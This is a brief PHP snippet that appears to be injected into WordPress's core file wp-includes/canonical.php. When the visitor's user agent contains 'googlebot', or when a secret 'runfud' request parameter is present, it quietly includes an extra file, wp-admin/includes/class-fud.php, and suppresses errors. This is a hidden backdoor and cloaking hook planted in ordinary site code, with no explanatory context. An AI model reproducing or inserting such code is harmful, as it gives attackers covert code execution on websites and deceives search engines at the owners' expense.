...
if (strpos(strtolower($_SERVER["HTTP_USER_AGENT"]),"googlebot") !== false or isset($_REQUEST["runfud"]) ){$s441 = str_replace("wp-includes/canonical.php","",__FILE__); $s441 = str_replace("wp-includes\canonical.php","",$s441); @include($s441 . "/wp-admin/includes/class-fud.php");}